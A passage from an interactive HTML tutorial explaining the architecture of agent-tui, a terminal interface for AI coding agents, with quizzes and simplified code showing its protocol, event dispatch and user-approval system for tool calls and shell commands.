olor-bg-warm);\n      padding: var(--space-3) var(--space-4);\n      border-radius: var(--radius-md);\n      flex: 1;\n    }\n    .chat-sender { font-weight: 600; font-size: var(--text-xs); display: block; margin-bottom: var(--space-1); }\n    .chat-bubble p { margin: 0; font-size: var(--text-sm); }\n    .chat-typing {\n      display: flex;\n      align-items: center;\n      gap: var(--space-3);\n      padding: var(--space-3) var(--space-4);\n      background: var(--color-bg-warm);\n    }\n    .chat-typing-dots { display: flex; gap: 4px; }\n    .typing-dot {\n      width: 8px;\n      height: 8px;\n      border-radius: 50%;\n      background: var(--color-text-muted);\n      animation: typingBounce 1.4s infinite;\n    }\n    .typing-dot:nth-child(2) { animation-delay: 0.2s; }\n    .typing-dot:nth-child(3) { animation-delay: 0.4s; }\n    @keyframes typingBounce {\n      0%, 60%, 100% { transform: translateY(0); }\n      30% { transform: translateY(-6px); }\n    }\n    .chat-controls {\n      display: flex;\n      gap: var(--space-3);\n      padding: var(--space-3) var(--space-4);\n      background: var(--color-bg);\n      border-top: 1px solid var(--color-border-light);\n    }\n    .chat-controls button {\n      padding: var(--space-2) var(--space-3);\n      border: 1px solid var(--color-border);\n      border-radius: var(--radius-sm);\n      background: var(--color-surface);\n      font-size: var(--text-xs);\n      cursor: pointer;\n    }\n    .chat-controls button:hover { border-color: var(--color-accent); }\n    .chat-progress { font-size: var(--text-xs); color: var(--color-text-muted); margin-left: auto; display: flex; align-items: center; }\n\n    /* Quiz */\n    .quiz-container { margin: var(--space-8) 0; }\n    .quiz-question-block { margin-bottom: var(--space-6); }\n    .quiz-question {\n      font-family: var(--font-display);\n      font-size: var(--text-lg);\n      font-weight: 600;\n      margin-bottom: var(--space-4);\n    }\n    .quiz-options { display: flex; flex-direction: column; gap: var(--space-2); }\n    .quiz-option {\n      display: flex;\n      align-items: center;\n      gap: var(--space-3);\n      padding: var(--space-3) var(--space-4);\n      border: 2px solid var(--color-border);\n      border-radius: var(--radius-sm);\n      background: var(--color-surface);\n      cursor: pointer;\n      font-family: var(--font-body);\n      font-size: var(--text-base);\n      text-align: left;\n      transition: border-color var(--duration-fast), background var(--duration-fast);\n    }\n    .quiz-option:hover { border-color: var(--color-accent-muted); }\n    .quiz-option.selected { border-color: var(--color-accent); background: var(--color-accent-light); }\n    .quiz-option.correct { border-color: var(--color-success); background: var(--color-success-light); }\n    .quiz-option.incorrect { border-color: var(--color-error); background: var(--color-error-light); }\n    .quiz-option-radio {\n      width: 18px;\n      height: 18px;\n      border-radius: 50%;\n      border: 2px solid var(--color-border);\n      flex-shrink: 0;\n      transition: all var(--duration-fast);\n    }\n    .quiz-option.selected .quiz-option-radio {\n      border-color: var(--color-accent);\n      background: var(--color-accent);\n      box-shadow: inset 0 0 0 3px white;\n    }\n    .quiz-feedback {\n      max-height: 0;\n      overflow: hidden;\n      opacity: 0;\n      transition: max-height var(--duration-normal), opacity var(--duration-normal);\n      margin-top: var(--space-2);\n    }\n    .quiz-feedback.show {\n      max-height: 200px;\n      opacity: 1;\n      padding: var(--space-3);\n      border-radius: var(--radius-sm);\n    }\n    .quiz-feedback.success { background: var(--color-success-light); color: var(--color-success); }\n    .quiz-feedback.error { background: var(--color-error-light); color: var(--color-error); }\n    .quiz-feedback.warning { background: var(--color-info-light); color: var(--color-info); }\n    .quiz-check-btn {\n      padding: var(--space-3) var(--space-6);\n      border: none;\n      border-radius: var(--radius-sm);\n      background: var(--color-accent);\n      color: white;\n      font-family: var(--font-body);\n      font-weight: 600;\n      cursor: pointer;\n      margin-right: var(--space-3);\n    }\n    .quiz-check-btn:hover { background: var(--color-accent-hover); }\n    .quiz-reset-btn {\n      padding: var(--space-3) var(--space-6);\n      border: 1px solid var(--color-border);\n      border-radius: var(--radius-sm);\n      background: var(--color-surface);\n      cursor: pointer;\n    }\n\n    /* Term tooltip */\n    .term {\n      border-bottom: 1.5px dashed var(--color-accent-muted);\n      cursor: pointer;\n    }\n    .term:hover, .term.active {\n      border-bottom-color: var(--color-accent);\n      color: var(--color-accent);\n    }\n    .term-tooltip {\n      position: fixed;\n      background: var(--color-bg-code);\n      color: #CDD6F4;\n      padding: var(--space-3) var(--space-4);\n      border-radius: var(--radius-sm);\n      font-size: var(--text-sm);\n      font-family: var(--font-body);\n      line-height: var(--leading-normal);\n      width: max(200px, min(320px, 80vw));\n      box-shadow: var(--shadow-lg);\n      pointer-events: none;\n      opacity: 0;\n      transition: opacity var(--duration-fast);\n      z-index: 10000;\n    }\n    .term-tooltip.visible { opacity: 1; }\n\n    /* Icon rows */\n    .icon-rows { display: flex; flex-direction: column; gap: var(--space-4); margin: var(--space-6) 0; }\n    .icon-row {\n      display: flex;\n      align-items: center;\n      gap: var(--space-4);\n      padding: var(--space-4);\n      background: var(--color-surface);\n      border-radius: var(--radius-md);\n      box-shadow: var(--shadow-sm);\n    }\n    .icon-circle {\n      width: 48px;\n      height: 48px;\n      border-radius: 50%;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n      font-size: 1.25rem;\n      flex-shrink: 0;\n    }\n    .icon-row p { margin: 0; color: var(--color-text-secondary); font-size: var(--text-sm); }\n\n    /* Responsive */\n    @media (max-width: 768px) {\n      :root {\n        --text-4xl: 1.875rem;\n        --text-5xl: 2.25rem;\n        --text-6xl: 3rem;\n      }\n      .translation-block { grid-template-columns: 1fr; }\n      .translation-english { border-left: none; border-top: 3px solid var(--color-accent); }\n      .pattern-cards { grid-template-columns: 1fr 1fr; }\n      .flow-actors { flex-direction: column; align-items: center; gap: var(--space-4); }\n      .flow-arrow { transform: rotate(90deg); }\n    }\n    @media (max-width: 480px) {\n      :root {\n        --text-4xl: 1.5rem;\n        --text-5xl: 1.875rem;\n        --text-6xl: 2.25rem;\n      }\n      .module { padding: var(--space-8) var(--space-4); }\n      .pattern-cards { grid-template-columns: 1fr; }\n    }\n  </style>\n</head>\n<body>\n\n<!-- Navigation -->\n<nav class=\"nav\">\n  <div class=\"progress-bar\" id=\"progress-bar\"></div>\n  <div class=\"nav-inner\">\n    <span class=\"nav-title\">How agent-tui Works</span>\n    <div class=\"nav-dots\">\n      <button class=\"nav-dot active\" data-target=\"module-1\" aria-label=\"Module 1\"></button>\n      <button class=\"nav-dot\" data-target=\"module-2\" aria-label=\"Module 2\"></button>\n      <button class=\"nav-dot\" data-target=\"module-3\" aria-label=\"Module 3\"></button>\n      <button class=\"nav-dot\" data-target=\"module-4\" aria-label=\"Module 4\"></button>\n      <button class=\"nav-dot\" data-target=\"module-5\" aria-label=\"Module 5\"></button>\n      <button class=\"nav-dot\" data-target=\"module-6\" aria-label=\"Module 6\"></button>\n    </div>\n  </div>\n</nav>\n\n<!-- Module 1: What is agent-tui? -->\n<section class=\"module\" id=\"module-1\">\n  <div class=\"module-content\">\n    <header class=\"module-header animate-in\">\n      <span class=\"module-number\">01</span>\n      <h1 class=\"module-title\">What is agent-tui?</h1>\n      <p class=\"module-subtitle\">A terminal that talks to AI coding agents — with safety guardrails built in</p>\n    </header>\n\n    <div class=\"screen animate-in\">\n      <p class=\"hero-text\">Your AI coding assistant,<br>in the terminal</p>\n      <p class=\"hero-sub\">agent-tui is a Text-based User Interface that lets you chat with an AI agent that can read your files, run shell commands, and help you code — all without leaving your terminal.</p>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Why use a TUI instead of a web interface?</h2>\n      <div class=\"pattern-cards stagger-children\">\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 0\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-1)\">⌨️</div>\n          <h4 class=\"pattern-title\">No browser needed</h4>\n          <p class=\"pattern-desc\">Works entirely in your terminal — perfect for server environments or SSH connections</p>\n        </div>\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 1\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-2)\">⚡</div>\n          <h4 class=\"pattern-title\">Keyboard-first</h4>\n          <p class=\"pattern-desc\">Fast navigation without touching a mouse — exactly how developers like it</p>\n        </div>\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 2\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-3)\">🛡️</div>\n          <h4 class=\"pattern-title\">Built-in safety</h4>\n          <p class=\"pattern-desc\">Every file operation and shell command requires your approval before running</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">What can the AI agent do?</h2>\n      <div class=\"step-cards stagger-children\">\n        <div class=\"step-card animate-in\" style=\"--stagger-index: 0\">\n          <div class=\"step-num\">1</div>\n          <div class=\"step-body\">\n            <strong>Read your files</strong>\n            <p>Ask it to explain a codebase, debug an error, or review code changes</p>\n          </div>\n        </div>\n        <div class=\"step-card animate-in\" style=\"--stagger-index: 1\">\n          <div class=\"step-num\">2</div>\n          <div class=\"step-body\">\n            <strong>Write and edit files</strong>\n            <p>Have it create new features, refactor code, or fix bugs directly</p>\n          </div>\n        </div>\n        <div class=\"step-card animate-in\" style=\"--stagger-index: 2\">\n          <div class=\"step-num\">3</div>\n          <div class=\"step-body\">\n            <strong>Run shell commands</strong>\n            <p>Execute build tools, tests, git commands — all with your approval</p>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">The approval system in action</h2>\n      <div class=\"flow-animation\">\n        <p style=\"margin-bottom: var(--space-4); color: var(--color-text-secondary); font-size: var(--text-sm);\">Click \"Next Step\" to see what happens when you ask the agent to run a shell command</p>\n        <div class=\"flow-actors\">\n          <div class=\"flow-actor\" id=\"flow-user\">\n            <div class=\"flow-actor-icon\" style=\"background: var(--color-actor-1)\">👤</div>\n            <span>You</span>\n          </div>\n          <div class=\"flow-arrow\">→</div>\n          <div class=\"flow-actor\" id=\"flow-agent\">\n            <div class=\"flow-actor-icon\" style=\"background: var(--color-actor-2)\">🤖</div>\n            <span>Agent</span>\n          </div>\n          <div class=\"flow-arrow\">→</div>\n          <div class=\"flow-actor\" id=\"flow-tui\">\n            <div class=\"flow-actor-icon\" style=\"background: var(--color-actor-3)\">🖥️</div>\n            <span>TUI</span>\n          </div>\n        </div>\n        <div class=\"flow-step-label\" id=\"flow-label\">Click \"Next Step\" to begin</div>\n        <div class=\"flow-controls\">\n          <button onclick=\"flowNext()\">Next Step</button>\n          <button onclick=\"flowReset()\">Restart</button>\n          <span class=\"flow-progress\" id=\"flow-progress\">Step 0/4</span>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <div class=\"callout callout-accent\">\n        <div class=\"callout-icon\">💡</div>\n        <div class=\"callout-content\">\n          <strong class=\"callout-title\">The key insight</strong>\n          <p>agent-tui uses a clever pattern called the <span class=\"term\" data-definition=\"A contract is like a job description — it defines what methods an object must have, without specifying how they're implemented. Think of it as a blueprint for how two pieces of code should communicate.\">Protocol</span>. The TUI doesn't care which AI backend you use — it just knows how to talk to any agent that follows the protocol.</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Quick check: What did you learn?</h2>\n      <div class=\"quiz-container\" id=\"quiz-1\">\n        <div class=\"quiz-question-block\" data-question=\"q1\" data-correct=\"option-b\">\n          <h3 class=\"quiz-question\">You want to run a shell command, but you're not sure if it's safe. What happens in agent-tui?</h3>\n          <div class=\"quiz-options\">\n            <button class=\"quiz-option\" data-value=\"option-a\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>It runs automatically — AI knows best</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-b\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>You see an approval widget and must explicitly allow or deny it</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-c\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>The TUI asks you to type \"yes\" in the chat</span>\n            </button>\n          </div>\n          <div class=\"quiz-feedback\" id=\"q1-feedback\"></div>\n        </div>\n\n        <div class=\"quiz-question-block\" data-question=\"q2\" data-correct=\"option-a\">\n          <h3 class=\"quiz-question\">Why does agent-tui use a Protocol instead of hardcoding one specific AI backend?</h3>\n          <div class=\"quiz-options\">\n            <button class=\"quiz-option\" data-value=\"option-a\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>So you can swap between different AI backends without changing the TUI code</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-b\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>Because Python requires it</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-c\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>It's faster than direct integration</span>\n            </button>\n          </div>\n          <div class=\"quiz-feedback\" id=\"q2-feedback\"></div>\n        </div>\n\n        <button class=\"quiz-check-btn\" onclick=\"checkQuiz('quiz-1')\">Check Answers</button>\n        <button class=\"quiz-reset-btn\" onclick=\"resetQuiz('quiz-1')\">Try Again</button>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- Module 2: Meet the Cast of Characters -->\n<section class=\"module\" id=\"module-2\">\n  <div class=\"module-content\">\n    <header class=\"module-header animate-in\">\n      <span class=\"module-number\">02</span>\n      <h1 class=\"module-title\">Meet the Cast of Characters</h1>\n      <p class=\"module-subtitle\">The main players in agent-tui's architecture</p>\n    </header>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">The six key components</h2>\n      <p style=\"margin-bottom: var(--space-6);\">Every software system has actors that work together. Here are the main ones in agent-tui:</p>\n      <div class=\"icon-rows\">\n        <div class=\"icon-row animate-in\" style=\"--stagger-index: 0\">\n          <div class=\"icon-circle\" style=\"background: var(--color-actor-1)\">🖥️</div>\n          <div>\n            <strong>AgentTuiApp</strong>\n            <p>The main application — the conductor that orchestrates everything</p>\n          </div>\n        </div>\n        <div class=\"icon-row animate-in\" style=\"--stagger-index: 1\">\n          <div class=\"icon-circle\" style=\"background: var(--color-actor-2)\">🔌</div>\n          <div>\n            <strong>AgentAdapter</strong>\n            <p>Translates events from the agent into actions the TUI can perform</p>\n          </div>\n        </div>\n        <div class=\"icon-row animate-in\" style=\"--stagger-index: 2\">\n          <div class=\"icon-circle\" style=\"background: var(--color-actor-3)\">📝</div>\n          <div>\n            <strong>AgentProtocol</strong>\n            <p>The contract — defines how any agent must behave to work with the TUI</p>\n          </div>\n        </div>\n        <div class=\"icon-row animate-in\" style=\"--stagger-index: 3\">\n          <div class=\"icon-circle\" style=\"background: var(--color-actor-4)\">🎭</div>\n          <div>\n            <strong>StubAgent</strong>\n            <p>A fake agent for testing — cycles through different scenarios automatically</p>\n          </div>\n        </div>\n        <div class=\"icon-row animate-in\" style=\"--stagger-index: 4\">\n          <div class=\"icon-circle\" style=\"background: var(--color-actor-5)\">🔧</div>\n          <div>\n            <strong>DeepAgentsAdapter</strong>\n            <p>The real agent backend — connects to actual AI models</p>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">AgentProtocol — the contract</h2>\n      <p style=\"margin-bottom: var(--space-4);\">The protocol defines what any agent must be able to do. Here's the core of it:</p>\n      <div class=\"translation-block\">\n        <div class=\"translation-code\">\n          <span class=\"translation-label\">CODE</span>\n          <pre><code><span class=\"code-keyword\">class</span> <span class=\"code-function\">AgentProtocol</span>(Protocol):\n  <span class=\"code-keyword\">async def</span> <span class=\"code-function\">stream</span>(message, thread_id):\n    <span class=\"code-keyword\">yield</span> AgentEvent(...)\n\n  <span class=\"code-keyword\">async def</span> <span class=\"code-function\">approve_tool</span>(tool_id, approved):\n    <span class=\"code-keyword\">...</span>\n\n  <span class=\"code-keyword\">async def</span> <span class=\"code-function\">cancel</span>():\n    <span class=\"code-keyword\">...</span></code></pre>\n        </div>\n        <div class=\"translation-english\">\n          <span class=\"translation-label\">PLAIN ENGLISH</span>\n          <p class=\"tl\"><strong>stream()</strong> — Takes your message, spits out events like \"here's some text\" or \"I want to run a tool\"</p>\n          <p class=\"tl\"><strong>approve_tool()</strong> — Called when you click Yes/No on an approval widget</p>\n          <p class=\"tl\"><strong>cancel()</strong> — Stops whatever the agent is currently doing</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">AgentEvent — what messages look like</h2>\n      <p style=\"margin-bottom: var(--space-4);\">Agents communicate with the TUI using typed events. Each event has a type and relevant data:</p>\n      <div class=\"step-cards stagger-children\">\n        <div class=\"step-card animate-in\" style=\"--stagger-index: 0\">\n          <div class=\"step-num\" style=\"background: var(--color-actor-1)\">📝</div>\n          <div class=\"step-body\">\n            <strong>MESSAGE_CHUNK</strong>\n            <p>A piece of text the agent is streaming to you — appears letter by letter</p>\n          </div>\n        </div>\n        <div class=\"step-card animate-in\" style=\"--stagger-index: 1\">\n          <div class=\"step-num\" style=\"background: var(--color-actor-2)\">🔧</div>\n          <div class=\"step-body\">\n            <strong>TOOL_CALL</strong>\n            <p>The agent wants to run a file operation or shell command — needs your approval</p>\n          </div>\n        </div>\n        <div class=\"step-card animate-in\" style=\"--stagger-index: 2\">\n          <div class=\"step-num\" style=\"background: var(--color-actor-3)\">❓</div>\n          <div class=\"step-body\">\n            <strong>ASK_USER</strong>\n            <p>The agent needs clarification on something before continuing</p>\n          </div>\n        </div>\n        <div class=\"step-card animate-in\" style=\"--stagger-index: 3\">\n          <div class=\"step-num\" style=\"background: var(--color-actor-4)\">⚠️</div>\n          <div class=\"step-body\">\n            <strong>ERROR</strong>\n            <p>Something went wrong — the agent will try to recover</p>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <div class=\"callout callout-info\">\n        <div class=\"callout-icon\">📖</div>\n        <div class=\"callout-content\">\n          <strong class=\"callout-title\">A new vocabulary word</strong>\n          <p>In programming, a <span class=\"term\" data-definition=\"An enum (enumeration) is a set of named values. Instead of using random numbers, you use clear names like 'RED' or 'GREEN' to make code more readable.\">StrEnum</span> is just an enum where all values are strings. EventType uses this so event names are human-readable in logs and code.</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Quiz: Component matching</h2>\n      <div class=\"quiz-container\" id=\"quiz-2\">\n        <div class=\"quiz-question-block\" data-question=\"q1\" data-correct=\"option-b\">\n          <h3 class=\"quiz-question\">You see the word \"Stub\" in StubAgent. What do you think it does?</h3>\n          <div class=\"quiz-options\">\n            <button class=\"quiz-option\" data-value=\"option-a\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>A backup agent that kicks in when the main one fails</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-b\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>A fake implementation for testing — it pretends to be a real agent</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-c\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>An optimized version that runs faster</span>\n            </button>\n          </div>\n          <div class=\"quiz-feedback\" id=\"q1-feedback\"></div>\n        </div>\n\n        <button class=\"quiz-check-btn\" onclick=\"checkQuiz('quiz-2')\">Check Answers</button>\n        <button class=\"quiz-reset-btn\" onclick=\"resetQuiz('quiz-2')\">Try Again</button>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- Module 3: How the Pieces Talk -->\n<section class=\"module\" id=\"module-3\">\n  <div class=\"module-content\">\n    <header class=\"module-header animate-in\">\n      <span class=\"module-number\">03</span>\n      <h1 class=\"module-title\">How the Pieces Talk</h1>\n      <p class=\"module-subtitle\">Tracing a message from you to the agent and back</p>\n    </header>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">The message journey</h2>\n      <p style=\"margin-bottom: var(--space-6);\">When you type a message and press Enter, here's what happens behind the scenes:</p>\n\n      <div class=\"chat-window\">\n        <div class=\"chat-messages\" id=\"chat-messages\">\n          <div class=\"chat-message\" data-msg=\"0\" data-sender=\"user\" style=\"display:none\">\n            <div class=\"chat-avatar\" style=\"background: var(--color-actor-1)\">👤</div>\n            <div class=\"chat-bubble\">\n              <span class=\"chat-sender\" style=\"color: var(--color-actor-1)\">You</span>\n              <p>Read README.md</p>\n            </div>\n          </div>\n          <div class=\"chat-message\" data-msg=\"1\" data-sender=\"tui\" style=\"display:none\">\n            <div class=\"chat-avatar\" style=\"background: var(--color-actor-3)\">🖥️</div>\n            <div class=\"chat-bubble\">\n              <span class=\"chat-sender\" style=\"color: var(--color-actor-3)\">TUI</span>\n              <p>Got it! Mounting your message widget and forwarding to agent...</p>\n            </div>\n          </div>\n          <div class=\"chat-message\" data-msg=\"2\" data-sender=\"agent\" style=\"display:none\">\n            <div class=\"chat-avatar\" style=\"background: var(--color-actor-2)\">🤖</div>\n            <div class=\"chat-bubble\">\n              <span class=\"chat-sender\" style=\"color: var(--color-actor-2)\">Agent</span>\n              <p>Thinking... I need to read that file. emitting MESSAGE_CHUNK...</p>\n            </div>\n          </div>\n          <div class=\"chat-message\" data-msg=\"3\" data-sender=\"agent\" style=\"display:none\">\n            <div class=\"chat-avatar\" style=\"background: var(--color-actor-2)\">🤖</div>\n            <div class=\"chat-bubble\">\n              <span class=\"chat-sender\" style=\"color: var(--color-actor-2)\">Agent</span>\n              <p>Tool needed: read_file. emitting TOOL_CALL event...</p>\n            </div>\n          </div>\n          <div class=\"chat-message\" data-msg=\"4\" data-sender=\"adapter\" style=\"display:none\">\n            <div class=\"chat-avatar\" style=\"background: var(--color-actor-4)\">🔌</div>\n            <div class=\"chat-bubble\">\n              <span class=\"chat-sender\" style=\"color: var(--color-actor-4)\">Adapter</span>\n              <p>Got TOOL_CALL for read_file. Requesting approval from user...</p>\n            </div>\n          </div>\n          <div class=\"chat-message\" data-msg=\"5\" data-sender=\"tui\" style=\"display:none\">\n            <div class=\"chat-avatar\" style=\"background: var(--color-actor-3)\">🖥️</div>\n            <div class=\"chat-bubble\">\n              <span class=\"chat-sender\" style=\"color: var(--color-actor-3)\">TUI</span>\n              <p>Showing approval widget!</p>\n            </div>\n          </div>\n        </div>\n\n        <div class=\"chat-typing\" id=\"chat-typing\" style=\"display:none\">\n          <div class=\"chat-avatar\" id=\"typing-avatar\" style=\"background: var(--color-actor-2)\">🤖</div>\n          <div class=\"chat-typing-dots\">\n            <span class=\"typing-dot\"></span>\n            <span class=\"typing-dot\"></span>\n            <span class=\"typing-dot\"></span>\n          </div>\n        </div>\n\n        <div class=\"chat-controls\">\n          <button onclick=\"playChatNext()\">Next Message</button>\n          <button onclick=\"playChatAll()\">Play All</button>\n          <button onclick=\"resetChat()\">Replay</button>\n          <span class=\"chat-progress\" id=\"chat-progress\">0 / 6 messages</span>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">The AgentAdapter — the translator</h2>\n      <p style=\"margin-bottom: var(--space-4);\">The adapter's job is to listen to events from the agent and call the right TUI methods. Here's the core dispatch logic:</p>\n      <div class=\"translation-block\">\n        <div class=\"translation-code\">\n          <span class=\"translation-label\">CODE</span>\n          <pre><code><span class=\"code-keyword\">async def</span> <span class=\"code-function\">_dispatch</span>(event):\n  <span class=\"code-keyword\">match</span> event.type:\n    <span class=\"code-keyword\">case</span> EventType.MESSAGE_CHUNK:\n      app.<span class=\"code-function\">append_assistant_text</span>(event.text)\n\n    <span class=\"code-keyword\">case</span> EventType.TOOL_CALL:\n      approved = <span class=\"code-keyword\">await</span> app.<span class=\"code-function\">request_tool_approval</span>(...)\n      <span class=\"code-keyword\">await</span> agent.<span class=\"code-function\">approve_tool</span>(tool_id, approved)\n\n    <span class=\"code-keyword\">case</span> EventType.TOOL_RESULT:\n      app.<span class=\"code-function\">show_tool_result</span>(...)</code></pre>\n        </div>\n        <div class=\"translation-english\">\n          <span class=\"translation-label\">PLAIN ENGLISH</span>\n          <p class=\"tl\">When a MESSAGE_CHUNK comes in, append text to the chat display</p>\n          <p class=\"tl\">When a TOOL_CALL comes in, ask the user for approval, then tell the agent what they chose</p>\n          <p class=\"tl\">When a TOOL_RESULT comes in, show the result in the UI</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <div class=\"callout callout-accent\">\n        <div class=\"callout-icon\">💡</div>\n        <div class=\"callout-content\">\n          <strong class=\"callout-title\">Why this separation matters</strong>\n          <p>The adapter doesn't know or care HOW the TUI shows things — it just calls methods. This means you could swap out the entire UI (say, for a web interface) without touching the agent code at all.</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Quiz: Event routing</h2>\n      <div class=\"quiz-container\" id=\"quiz-3\">\n        <div class=\"quiz-question-block\" data-question=\"q1\" data-correct=\"option-c\">\n          <h3 class=\"quiz-question\">An agent emits a TOOL_RESULT event. Where does the adapter send this?</h3>\n          <div class=\"quiz-options\">\n            <button class=\"quiz-option\" data-value=\"option-a\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>Directly to the agent for processing</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-b\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>To the approval widget</span>\n            </button>\n            <button class=\"quiz-option\" data-value=\"option-c\" onclick=\"selectOption(this)\">\n              <div class=\"quiz-option-radio\"></div>\n              <span>To the TUI's show_tool_result method</span>\n            </button>\n          </div>\n          <div class=\"quiz-feedback\" id=\"q1-feedback\"></div>\n        </div>\n\n        <button class=\"quiz-check-btn\" onclick=\"checkQuiz('quiz-3')\">Check Answers</button>\n        <button class=\"quiz-reset-btn\" onclick=\"resetQuiz('quiz-3')\">Try Again</button>\n      </div>\n    </div>\n  </div>\n</section>\n\n<!-- Module 4: The Approval System -->\n<section class=\"module\" id=\"module-4\">\n  <div class=\"module-content\">\n    <header class=\"module-header animate-in\">\n      <span class=\"module-number\">04</span>\n      <h1 class=\"module-title\">The Approval System</h1>\n      <p class=\"module-subtitle\">How agent-tui keeps dangerous operations under your control</p>\n    </header>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">Why approval matters</h2>\n      <p style=\"margin-bottom: var(--space-4);\">An AI agent that can read files, write code, and run shell commands is powerful — and potentially dangerous. The approval system puts YOU in control.</p>\n      <div class=\"pattern-cards stagger-children\">\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 0; border-top: 3px solid var(--color-actor-1)\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-1)\">👁️</div>\n          <h4 class=\"pattern-title\">You see what's coming</h4>\n          <p class=\"pattern-desc\">Before any file is touched or command runs, you see exactly what will happen</p>\n        </div>\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 1; border-top: 3px solid var(--color-actor-2)\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-2)\">✋</div>\n          <h4 class=\"pattern-title\">You choose</h4>\n          <p class=\"pattern-desc\">Approve safe operations, deny suspicious ones, or auto-approve with Ctrl+T</p>\n        </div>\n        <div class=\"pattern-card animate-in\" style=\"--stagger-index: 2; border-top: 3px solid var(--color-actor-3)\">\n          <div class=\"pattern-icon\" style=\"background: var(--color-actor-3)\">🔄</div>\n          <h4 class=\"pattern-title\">Agent waits</h4>\n          <p class=\"pattern-desc\">The agent pauses until you decide — it can't proceed without your say-so</p>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">What the adapter checks before showing the approval</h2>\n      <p style=\"margin-bottom: var(--space-4);\">Before the approval widget even appears, the adapter does safety checks:</p>\n      <div class=\"step-cards\">\n        <div class=\"step-card\">\n          <div class=\"step-num\" style=\"background: var(--color-actor-1)\">1</div>\n          <div class=\"step-body\">\n            <strong>Is it a file tool?</strong>\n            <p>Check if the path is within allowed directories</p>\n          </div>\n        </div>\n        <div class=\"step-card\">\n          <div class=\"step-num\" style=\"background: var(--color-actor-2)\">2</div>\n          <div class=\"step-body\">\n            <strong>Is it a shell command?</strong>\n            <p>Check for dangerous patterns like $(command) or $VAR</p>\n          </div>\n        </div>\n        <div class=\"step-card\">\n          <div class=\"step-num\" style=\"background: var(--color-actor-3)\">3</div>\n          <div class=\"step-body\">\n            <strong>Show approval widget</strong>\n            <p>If checks pass, show the widget and wait for user input</p>\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <div class=\"screen animate-in\">\n      <h2 class=\"screen-heading\">The approval flow in code</h2>\n      <div class=\"translation-block\">\n        <div class=\"translation-code\">\n          <span class=\"translation-label\">CODE</span>\n          <pre><code><span class=\"code-keyword\">case</span> EventType.TOOL_CALL:\n  <span class=\"code-comment\"># Check for dangerous shell patterns</span>\n  <span class=\"code-keyword\">if</span> event.tool_name == <span class=\"code-string\">\"execute\"</span>:\n    <span class=\"code-keyword\">if</span> <span class=\"code-function\">contains_dangerous_patterns</span>(command):\n      <span class=\"code-keyword\">await</span> agent.<span class=\"code-function\">approve_tool</span>(tool_id, False)\n      app.<span class=\"code-function\">show_error</span>(<span class=\"code-string\">\"Command blocked\"</span>)\n      <span class=\"code-keyword\">return</span>\n\n  <span class=\"code-comment\"># Request approval from user</span>\n  approved = <span class=\"code-keyword\">await</span> app.<span class=\"code-function\">request_tool_approval</span>(...)\n  <span class=\"code-keyword\">await</span> agent.<span class=\"code-function\">approve_tool</span>(tool_id, approved)</code></pre>\n        </div>\n        <div class=\"translation-english\">\n          <span class=\"translation-label\">PLAIN ENGLISH</span>\n          <p class=\"tl\">For execute (shell) commands, check if the command contains dangerous patterns first</p>\n          <p class=\"tl\">If dangerous patterns are found, auto-reject and show an error 